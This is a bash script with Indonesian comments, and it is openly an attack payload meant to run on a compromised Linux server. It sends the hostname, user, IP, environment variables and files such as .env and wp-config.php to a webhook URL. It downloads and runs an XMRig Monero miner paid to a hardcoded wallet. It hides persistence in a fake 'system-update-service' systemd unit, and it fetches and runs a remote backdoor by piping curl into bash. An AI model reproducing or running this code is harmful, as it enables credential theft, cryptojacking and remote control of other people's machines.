#!/bin/bash

# ==========================================
# CONFIGURATION
# ==========================================
# Ganti dengan URL Webhook.site Anda
EXFIL_URL="https://webhook.site/GANTI-DENGAN-UUID-ANDA"

# Wallet Monero Anda
XMR_WALLET="44fP8BsWuuo387699tZzjQbfApvMwrghidJvSJrGC7S7Fziq7GgexEML5SbA5CykJYFUb6bwvyrP2LPaRwshcfhwF58sZU7"

# Secret Key HSocket (Backdoor)
HSOCKET_KEY="Marsupilami666@@"

# Nama Service Palsu (Biar dikira update system)
SERVICE_NAME="system-update-service"
# ==========================================

# 1. EXFILTRATION (Curi Data Dulu sebelum ketahuan)
echo "[*] Exfiltrating secrets..."
# Kirim info sistem
curl -X POST -d "host=$(hostname)" -d "user=$(whoami)" -d "ip=$(curl -s ifconfig.me)" "$EXFIL_URL" > /dev/null 2>&1

# Kirim file penting
for file in .env .env.local config.js wp-config.php next.config.js; do
    if [ -f "$file" ]; then
        curl -X POST -d "filename=$file" -d "content=$(cat "$file")" "$EXFIL_URL" > /dev/null 2>&1
    fi
done

# Kirim environment variables
curl -X POST -d "filename=printenv" -d "content=$(printenv)" "$EXFIL_URL" > /dev/null 2>&1


# 2. INSTALL MINER & BACKDOOR
echo "[*] Setting up Miner & Backdoor..."

# Download XMRig
if [ ! -f /tmp/xmrig ]; then
    wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz -O /tmp/xmrig.tar.gz
    tar -xvf /tmp/xmrig.tar.gz -C /tmp/
    mv /tmp/xmrig-6.21.0/xmrig /tmp/xmrig
    chmod +x /tmp/xmrig
    rm -rf /tmp/xmrig.tar.gz /tmp/xmrig-6.21.0
fi

# 3. PERSISTENCE (Systemd - Root Only)
if [ "$(id -u)" -eq 0 ] && command -v systemctl >/dev/null 2>&1; then
    echo "[*] Root detected. Installing Systemd Service..."
    
    SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
    
    cat <<EOF > "$SERVICE_FILE"
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
# Jalankan Miner DAN Backdoor HSocket sekaligus
ExecStart=/bin/bash -c '/tmp/xmrig -o pool.hashvault.pro:443 -u ${XMR_WALLET} -p x -k --tls --background; export GS_SECRET="${HSOCKET_KEY}"; curl -fsSL https://hsocket.io/8 | bash'
Restart=always
RestartSec=60
User=root

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME"
    systemctl start "$SERVICE_NAME"
    echo "[+] Persistence installed via Systemd."

else
    # 4. FALLBACK (Non-Root / No Systemd)
    echo "[*] Non-root environment. Using nohup..."
    
    # Jalankan Miner
    nohup /tmp/xmrig -o pool.hashvault.pro:443 -u "$XMR_WALLET" -p x -k --tls --background > /dev/null 2>&1 &
    
    # Jalankan HSocket
    export GS_SECRET="$HSOCKET_KEY"
    nohup bash -c "$(curl -fsSL https://hsocket.io/8)" > /dev/null 2>&1 &
fi

# Cleanup
echo "[+] PWNED. Check your webhook & wallet."